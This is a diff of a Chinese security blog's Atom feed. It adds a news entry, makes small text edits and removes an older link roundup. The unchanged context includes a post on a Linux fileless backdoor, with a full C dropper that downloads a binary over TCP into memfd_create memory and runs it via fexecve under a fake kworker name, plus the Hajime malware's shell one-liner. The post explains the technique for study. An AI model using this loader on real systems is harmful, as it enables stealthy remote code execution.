@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://kevien.github.io/"/>
-  <updated>2018-02-26T15:39:45.000Z</updated>
+  <updated>2018-03-05T05:27:54.609Z</updated>
   <id>http://kevien.github.io/</id>
   
   <author>
@@ -14,6 +14,20 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>20180305安全动态</title>
+    <link href="http://kevien.github.io/2018/03/05/20180305%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
+    <id>http://kevien.github.io/2018/03/05/20180305安全动态/</id>
+    <published>2018-03-05T05:27:54.000Z</published>
+    <updated>2018-03-05T05:27:54.609Z</updated>
+    
+    <summary type="html">
+    
+    </summary>
+    
+    
+  </entry>
   
   <entry>
     <title>通过return-to-libc绕过NX-bit</title>
@@ -61,7 +75,7 @@
     <updated>2018-03-02T06:37:05.842Z</updated>
     
     <content type="html"><![CDATA[<h4 id="每周安全动态"><a href="#每周安全动态" class="headerlink" title="每周安全动态"></a>每周安全动态</h4><ul>
-<li>Bug Bounty Web 漏洞挖掘的几个小 Tips<br><a href="&#109;&#97;&#x69;&#x6c;&#116;&#111;&#x3a;&#x68;&#x74;&#x74;&#112;&#115;&#x3a;&#47;&#x2f;&#x6d;&#x65;&#100;&#105;&#x75;&#109;&#46;&#99;&#x6f;&#109;&#x2f;&#x40;&#x70;&#114;&#97;&#116;&#x65;&#x65;&#x6b;&#x5f;&#x30;&#52;&#x39;&#x30;&#x2f;&#98;&#117;&#103;&#x2d;&#x62;&#x6f;&#x75;&#110;&#x74;&#121;&#x2d;&#x74;&#x69;&#x70;&#115;&#x2d;&#116;&#x72;&#x69;&#99;&#107;&#115;&#45;&#x6a;&#115;&#x2d;&#x6a;&#97;&#118;&#x61;&#115;&#99;&#x72;&#105;&#x70;&#x74;&#45;&#102;&#105;&#x6c;&#x65;&#115;&#45;&#98;&#x64;&#100;&#101;&#x34;&#x31;&#x32;&#101;&#x61;&#x34;&#57;&#x64;">&#x68;&#x74;&#x74;&#112;&#115;&#x3a;&#47;&#x2f;&#x6d;&#x65;&#100;&#105;&#x75;&#109;&#46;&#99;&#x6f;&#109;&#x2f;&#x40;&#x70;&#114;&#97;&#116;&#x65;&#x65;&#x6b;&#x5f;&#x30;&#52;&#x39;&#x30;&#x2f;&#98;&#117;&#103;&#x2d;&#x62;&#x6f;&#x75;&#110;&#x74;&#121;&#x2d;&#x74;&#x69;&#x70;&#115;&#x2d;&#116;&#x72;&#x69;&#99;&#107;&#115;&#45;&#x6a;&#115;&#x2d;&#x6a;&#97;&#118;&#x61;&#115;&#99;&#x72;&#105;&#x70;&#x74;&#45;&#102;&#105;&#x6c;&#x65;&#115;&#45;&#98;&#x64;&#100;&#101;&#x34;&#x31;&#x32;&#101;&#x61;&#x34;&#57;&#x64;</a></li>
+<li>Bug Bounty Web 漏洞挖掘的几个小 Tips<br><a href="&#x6d;&#97;&#105;&#108;&#116;&#111;&#58;&#104;&#116;&#x74;&#112;&#115;&#x3a;&#47;&#x2f;&#x6d;&#101;&#x64;&#105;&#x75;&#x6d;&#x2e;&#x63;&#111;&#109;&#47;&#x40;&#x70;&#114;&#97;&#x74;&#x65;&#x65;&#107;&#95;&#x30;&#52;&#x39;&#x30;&#x2f;&#x62;&#117;&#x67;&#x2d;&#x62;&#x6f;&#x75;&#x6e;&#116;&#121;&#x2d;&#x74;&#105;&#x70;&#115;&#45;&#116;&#114;&#x69;&#99;&#107;&#x73;&#x2d;&#x6a;&#x73;&#45;&#106;&#x61;&#x76;&#x61;&#x73;&#99;&#x72;&#x69;&#112;&#x74;&#x2d;&#102;&#x69;&#x6c;&#101;&#115;&#45;&#98;&#x64;&#100;&#101;&#x34;&#x31;&#50;&#x65;&#x61;&#52;&#57;&#100;">&#104;&#116;&#x74;&#112;&#115;&#x3a;&#47;&#x2f;&#x6d;&#101;&#x64;&#105;&#x75;&#x6d;&#x2e;&#x63;&#111;&#109;&#47;&#x40;&#x70;&#114;&#97;&#x74;&#x65;&#x65;&#107;&#95;&#x30;&#52;&#x39;&#x30;&#x2f;&#x62;&#117;&#x67;&#x2d;&#x62;&#x6f;&#x75;&#x6e;&#116;&#121;&#x2d;&#x74;&#105;&#x70;&#115;&#45;&#116;&#114;&#x69;&#99;&#107;&#x73;&#x2d;&#x6a;&#x73;&#45;&#106;&#x61;&#x76;&#x61;&#x73;&#99;&#x72;&#x69;&#112;&#x74;&#x2d;&#102;&#x69;&#x6c;&#101;&#115;&#45;&#98;&#x64;&#100;&#101;&#x34;&#x31;&#50;&#x65;&#x61;&#52;&#57;&#100;</a></li>
 <li>Linux ASLR 缓解措施的新绕过方法<br><a href="http://blog.ptsecurity.com/2018/02/new-bypass-and-protection-techniques.html" target="_blank" rel="external">http://blog.ptsecurity.com/2018/02/new-bypass-and-protection-techniques.html</a></li>
 <li>Linux 系统调用的过程剖析<br><a href="https://lwn.net/Articles/604287/" target="_blank" rel="external">https://lwn.net/Articles/604287/</a></li>
 <li>Windows 平台用户态 API 监控与代码注入的检测<br><a href="https://0x00sec.org/t/userland-api-monitoring-and-code-injection-detection/5565" target="_blank" rel="external">https://0x00sec.org/t/userland-api-monitoring-and-code-injection-detection/5565</a></li>
@@ -85,7 +99,7 @@
     <summary type="html">
     
       &lt;h4 id=&quot;每周安全动态&quot;&gt;&lt;a href=&quot;#每周安全动态&quot; class=&quot;headerlink&quot; title=&quot;每周安全动态&quot;&gt;&lt;/a&gt;每周安全动态&lt;/h4&gt;&lt;ul&gt;
-&lt;li&gt;Bug Bounty Web 漏洞挖掘的几个小 Tips&lt;br&gt;&lt;a href=&quot;&amp;#109;&amp;
+&lt;li&gt;Bug Bounty Web 漏洞挖掘的几个小 Tips&lt;br&gt;&lt;a href=&quot;&amp;#x6d;&amp;
     
     </summary>
     
@@ -97,7 +111,7 @@
     <link href="http://kevien.github.io/2018/02/20/linux%E4%B8%80%E7%A7%8D%E6%97%A0%E6%96%87%E4%BB%B6%E5%90%8E%E9%97%A8%E6%8A%80%E5%B7%A7/"/>
     <id>http://kevien.github.io/2018/02/20/linux一种无文件后门技巧/</id>
     <published>2018-02-20T03:51:50.000Z</published>
-    <updated>2018-02-23T06:44:16.614Z</updated>
+    <updated>2018-03-08T10:54:09.603Z</updated>
     
     <content type="html"><![CDATA[<h4 id="TD-DR"><a href="#TD-DR" class="headerlink" title="TD;DR"></a>TD;DR</h4><ul>
 <li><p>几周之前我看了这篇<a href="https://blog.gdssecurity.com/labs/2017/9/5/linux-based-inter-process-code-injection-without-ptrace2.html" target="_blank" rel="external">文章</a>,介绍的是不使用ptrace来进行linux进程注入的(使用ptrace进行进程注入的文章可以看向这里<a href="https://kevien.github.io/2018/01/28/linux进程注入/">linux进程注入</a>)，这篇文章很有意思建议你读一下，但引起我关注是的文末的一句话</p>
@@ -111,20 +125,20 @@
 <li>第二个函数，fexecve同样的功能很强大，它能使我们执行一个程序（同execve），但是传递给这个函数的是文件描述符，而不是文件的绝对路径，也就是说搭配起来memfd_create使用简直完美！</li>
 <li>但是这里有一个需要注意的地方就是，因为这两个函数相对的比较新，memfd_create 是在kernel3.17才被引进来，fexecve是libc的一个函数，是在版本2.3.2之后才有的，当然没有fexecve的时候，我们也可以使用其它方式去取代它（后面会讨论），而memfd_create只能用在相对较新的linux内核系统上。</li>
 <li>这意味着至少在现在，这个技巧在一些运行着老内核和没有libc的嵌入式设备上是不可行的，我没有测试一些路由器和安卓设备上是否存在fexecve函数，我觉得是没有的，如有人知道，请在评论处告知；）<h4 id="一个简单的dropper"><a href="#一个简单的dropper" class="headerlink" title="一个简单的dropper"></a>一个简单的dropper</h4></li>
-<li>为了了解这两个函数是怎么工作的，我写了一个简单的dropper，这个dropper可以下载远程服务器上的二进制文件并且直接在内存中运行，不会存取在磁盘上。</li>
+<li>为了了解这两个函数是怎么工作的，我写了一个简单的dropper，这个dropper可以下载远程服务器上的二进制文件并且直接在内存中运行，不会存储在磁盘上。</li>
 <li>在这之前，我们先来看看之前文章中讨论过的<a href="https://0x00sec.org/t/iot-malware-droppers-mirai-and-hajime/1966" target="_blank" rel="external">Hajime</a>这个例子,这个例子使用了一行shell命令来创建一个文件（‘继承‘了另外一个文件的可执行权限）并且执行它然后再删除它。如果你不想打开链接，我之前把这行shell搬过来<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cp .s .i; &gt;.i; ./.s&gt;.i; ./.i; rm .s; /bin/busybox ECCHI</div></pre></td></tr></table></figure>
 </li>
 </ul>
 <p>我们将要创建一个新的.s,一旦执行，将会达到执行类型上面一行shell同样的效果。</p>
 <ul>
-<li><p>让我们先来看一下这个代码吧</p>
+<li><p>让我们先来看一下这个代码</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line"></div><div class="line">#include &lt;sys/syscall.h&gt;</div><div class="line"></div><div class="line">#include &lt;unistd.h&gt;</div><div class="line">#include &lt;sys/types.h&gt;</div><div class="line">#include &lt;sys/socket.h&gt;</div><div class="line">#include &lt;arpa/inet.h&gt;</div><div class="line"></div><div class="line">#define __NR_memfd_create 319</div><div class="line">#define MFD_CLOEXEC 1</div><div class="line"></div><div class="line">static inline int memfd_create(const char *name, unsigned int flags) &#123;</div><div class="line">    return syscall(__NR_memfd_create, name, flags);</div><div class="line">&#125;</div><div class="line"></div><div class="line">extern char        **environ;</div><div class="line"></div><div class="line">int main (int argc, char **argv) &#123;</div><div class="line">  int                fd, s;</div><div class="line">  unsigned long      addr = 0x0100007f11110002;</div><div class="line">  char               *args[2]= &#123;&quot;[kworker/u!0]&quot;, NULL&#125;;</div><div class="line">  char               buf[1024];</div><div class="line"></div><div class="line">  // Connect</div><div class="line">  if ((s = socket (PF_INET, SOCK_STREAM, IPPROTO_TCP)) &lt; 0) exit (1);</div><div class="line">  if (connect (s, (struct sockaddr*)&amp;addr, 16) &lt; 0) exit (1);</div><div class="line">  if ((fd = memfd_create(&quot;a&quot;, MFD_CLOEXEC)) &lt; 0) exit (1);</div><div class="line"></div><div class="line">  while (1) &#123;</div><div class="line">      if ((read (s, buf, 1024) ) &lt;= 0) break;</div><div class="line">      write (fd, buf, 1024);</div><div class="line">    &#125;</div><div class="line">  close (s);</div><div class="line">  </div><div class="line">  if (fexecve (fd, args, environ) &lt; 0) exit (1);</div><div class="line"></div><div class="line">  return 0;</div><div class="line">    </div><div class="line">&#125;</div></pre></td></tr></table></figure>
 </li>
 <li><p>代码很短也很简单，但是这里有几个点需要稍微介绍一下。</p>
 <h4 id="调用memfd-create"><a href="#调用memfd-create" class="headerlink" title="调用memfd_create"></a>调用memfd_create</h4></li>
 <li>第一个要介绍的就是，libc并没有对memfd_create这个系统调用进行封装（你可以在这里看到这个系统调用的相关信息<a href="http://man7.org/linux/man-pages/man2/memfd_create.2.html#NOTES" target="_blank" rel="external">memfd_create manpage’s NOTES section</a>）,这就意味着我们需要自己去封装一下。</li>
 <li>首先我们需要找到memfd_create在系统调用中的索引，通过一些在线的系统调用表，这个索引在不同的架构下是不同的，如果你想将上面的代码应用在ARM和MIPS上,可能需要不同的索引，在X86_64系统架构下的索引是319.</li>
-<li>我们使用了libc的syscall去对memfd_create进行了封装。</li>
+<li>我使用了libc的syscall去对memfd_create进行了封装。</li>
 <li>这个程序主要做了下面的事情</li>
 <li>1.创建了一个TCP socket</li>
 <li><p>2，使用AF_INET连接了127.0.0.1的0x1111端口，我们可以把这些所有的打包到一个变量里面这样可以使我们的代码看起来更短一点儿，同样你也可以去修改成你想要的ip和端口。</p>
@@ -865,58 +879,6 @@
     
       &lt;h4 id=&quot;每周安全动态&quot;&gt;&lt;a href=&quot;#每周安全动态&quot; class=&quot;headerlink&quot; title=&quot;每周安全动态&quot;&gt;&lt;/a&gt;每周安全动态&lt;/h4&gt;&lt;ul&gt;
 &lt;li&gt;RECon 2017 会议的演讲视频公开了&lt;br&gt;&lt;a href=&quot;https://recon.
-    
-    </summary>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>20171121安全动态</title>
-    <link href="http://kevien.github.io/2017/11/21/20171121%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
-    <id>http://kevien.github.io/2017/11/21/20171121安全动态/</id>
-    <published>2017-11-21T05:03:04.000Z</published>
-    <updated>2017-12-15T11:40:28.851Z</updated>
-    
-    <content type="html"><![CDATA[<h4 id="每日安全动态"><a href="#每日安全动态" class="headerlink" title="每日安全动态"></a>每日安全动态</h4><ul>
-<li>如何在 Windows PE 文件中植入一个无法检测到的后门<br><a href="https://haiderm.com/fully-undetectable-backdooring-pe-files/" target="_blank" rel="external">https://haiderm.com/fully-undetectable-backdooring-pe-files/</a></li>
-<li>Linux 内核 net/ipv4/inet_connection_sock.c inet_csk_clone_lock Double Free 漏洞（CVE-2017-8890）PoC<br><a href="https://github.com/hardenedlinux/offensive_poc/tree/master/CVE-2017-8890" target="_blank" rel="external">https://github.com/hardenedlinux/offensive_poc/tree/master/CVE-2017-8890</a></li>
-<li>使用递归攻击未初始化变量<br><a href="https://signal11.io/index.php/2017/11/19/attacking-uninitialized-variables-with-recursion/" target="_blank" rel="external">https://signal11.io/index.php/2017/11/19/attacking-uninitialized-variables-with-recursion/</a></li>
-<li>使用 SCF 文件窃取用户 Hash<br><a href="https://1337red.wordpress.com/using-a-scf-file-to-gather-hashes/" target="_blank" rel="external">https://1337red.wordpress.com/using-a-scf-file-to-gather-hashes/</a></li>
-<li>Meterpreter 渗透框架的 getsystem 命令是如何夺取 SYSTEM 权限的<br><https: blog.xpnsec.com="" becoming-system=""></https:></li>
-<li>CVE-2017-11882<br><a href="https://github.com/embedi/CVE-2017-11882" target="_blank" rel="external">https://github.com/embedi/CVE-2017-11882</a></li>
-<li>burp-molly-scanner - 将 BurpSuite 变成 Headless 的 Web 应用漏洞扫描器<br><a href="https://github.com/yandex/burp-molly-scanner/" target="_blank" rel="external">https://github.com/yandex/burp-molly-scanner/</a></li>
-<li>使用 XSS 窃取 CSRF Token<br><a href="https://digi.ninja/blog/xss_steal_csrf_token.php" target="_blank" rel="external">https://digi.ninja/blog/xss_steal_csrf_token.php</a></li>
-<li>微软提供了一个 Windows 10 开发环境虚拟机，里面预装了 SDK、Visual Studio、Bash on Ubuntu on Windows 等等<br><a href="https://developer.microsoft.com/en-us/windows/downloads/virtual-machines" target="_blank" rel="external">https://developer.microsoft.com/en-us/windows/downloads/virtual-machines</a></li>
-<li>利用 WMI 进行 C＆C 通信<br><a href="https://pentestlab.blog/2017/11/20/command-and-control-wmi/" target="_blank" rel="external">https://pentestlab.blog/2017/11/20/command-and-control-wmi/</a></li>
-<li><p>Windows 下载远程 Payload 并执行任意代码的教程<br><a href="https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/" target="_blank" rel="external">https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">之前好像看过中文的</div></pre></td></tr></table></figure>
-</li>
-<li><p>在 Windows 环境中追查凭证导出的痕迹，来自 2017 ZeroNights<br><a href="https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment" target="_blank" rel="external">https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment</a></p>
-</li>
-<li>Finding RCE in HP’s Printer Fleet<br><a href="https://foxglovesecurity.com/2017/11/20/a-sheep-in-wolfs-clothing-finding-rce-in-hps-printer-fleet/" target="_blank" rel="external">https://foxglovesecurity.com/2017/11/20/a-sheep-in-wolfs-clothing-finding-rce-in-hps-printer-fleet/</a></li>
-<li>颠覆windows的信任体系——实现任意代码签名劫持<br><a href="https://mp.weixin.qq.com/s/LCo7elFjGzZIVTA4DDuD8Q" target="_blank" rel="external">https://mp.weixin.qq.com/s/LCo7elFjGzZIVTA4DDuD8Q</a></li>
-<li>bincat - 一款二进制代码静态分析器<br><a href="https://securityonline.info/bincat-binary-code-static/" target="_blank" rel="external">https://securityonline.info/bincat-binary-code-static/</a></li>
-<li>docker-cuckoo - 将 Cuckoo Sandbox 封装进 Docker<br><a href="https://github.com/blacktop/docker-cuckoo" target="_blank" rel="external">https://github.com/blacktop/docker-cuckoo</a></li>
-<li>Ring3 / Ring0 Rootkit Hook Detection 1/2<br><a href="http://www.pentestingexperts.com/ring3-ring0-rootkit-hook-detection-1-2/" target="_blank" rel="external">http://www.pentestingexperts.com/ring3-ring0-rootkit-hook-detection-1-2/</a></li>
-<li>The Art of Fuzzing – slides and demos<br><a href="https://sec-consult.com/en/blog/2017/11/the-art-of-fuzzing-slides-and-demos/index.html" target="_blank" rel="external">https://sec-consult.com/en/blog/2017/11/the-art-of-fuzzing-slides-and-demos/index.html</a></li>
-<li>测试主流 Web 服务器（IIS、Apache、Nginx）在处理文件上传时的文件类型黑白名单问题<br><a href="https://mike-n1.github.io/ExtensionsOverview" target="_blank" rel="external">https://mike-n1.github.io/ExtensionsOverview</a></li>
-<li>From Markdown to RCE in Atom<br><a href="https://statuscode.ch/2017/11/from-markdown-to-rce-in-atom/" target="_blank" rel="external">https://statuscode.ch/2017/11/from-markdown-to-rce-in-atom/</a></li>
-<li>SSF - 在 TLS 隧道下提供 TCP/UDP 端口转发、SOCKS5 代理以及远程 Shell 的工具<br><a href="https://github.com/securesocketfunneling/ssf" target="_blank" rel="external">https://github.com/securesocketfunneling/ssf</a></li>
-<li>Sysmon v6.20 发布，新增了一个改变服务和驱动名称的功能，可以避免恶意软件通过名字判断 Sysmon 的存在<br><https: docs.microsoft.com="" en-us="" sysinternals="" downloads="" sysmon=""></https:></li>
-<li>CRLF 头注入与任意 URL 跳转漏洞利用技巧<br>&lt; <a href="https://speakerdeck.com/shikarisenpai/crlf-and-openredirect-for-dummies&gt;" target="_blank" rel="external">https://speakerdeck.com/shikarisenpai/crlf-and-openredirect-for-dummies&gt;</a></li>
-<li>Windows 交互式会话数字取证研究<br><a href="https://countuponsecurity.com/2017/11/22/digital-forensics-artifacts-of-interactive-sessions/" target="_blank" rel="external">https://countuponsecurity.com/2017/11/22/digital-forensics-artifacts-of-interactive-sessions/</a></li>
-<li>使用 DNS 打破 AWS 云环境中的隔离网络<br><a href="https://dejandayoff.com/using-dns-to-break-out-of-isolated-networks-in-a-aws-cloud-environment/" target="_blank" rel="external">https://dejandayoff.com/using-dns-to-break-out-of-isolated-networks-in-a-aws-cloud-environment/</a></li>
-<li>网络犯罪分子如何滥用聊天平台 API 作为C&amp;C 通信的基础设施<br><a href="https://documents.trendmicro.com/assets/wp/wp-how-cybercriminals-can-abuse-chat-platform-apis-as-cnc-infrastructures.pdf" target="_blank" rel="external">https://documents.trendmicro.com/assets/wp/wp-how-cybercriminals-can-abuse-chat-platform-apis-as-cnc-infrastructures.pdf</a></li>
-<li>Mitre 组织创建了一个称作 ATT&amp;CK 的项目，之前有过推送，这个项目整理了攻击和入侵者常用的一些技术和策略。看到这个项目之后，来自 Veramine 团队的研究员也创建了一个项目，用于总结和讨论如何检测和防御 ATT&amp;CK 项目中涉及的攻击技术<br><a href="https://github.com/veramine/Detections/wiki" target="_blank" rel="external">https://github.com/veramine/Detections/wiki</a></li>
-<li>Ursnif 变种利用 TLS Callback 技术实现进程注入<br><a href="https://www.fireeye.com/blog/threat-research/2017/11/ursnif-variant-malicious-tls-callback-technique.html" target="_blank" rel="external">https://www.fireeye.com/blog/threat-research/2017/11/ursnif-variant-malicious-tls-callback-technique.html</a><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">有源码</div></pre></td></tr></table></figure></li>
-</ul>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h4 id=&quot;每日安全动态&quot;&gt;&lt;a href=&quot;#每日安全动态&quot; class=&quot;headerlink&quot; title=&quot;每日安全动态&quot;&gt;&lt;/a&gt;每日安全动态&lt;/h4&gt;&lt;ul&gt;
-&lt;li&gt;如何在 Windows PE 文件中植入一个无法检测到的后门&lt;br&gt;&lt;a href=&quot;https
     
     </summary>
     
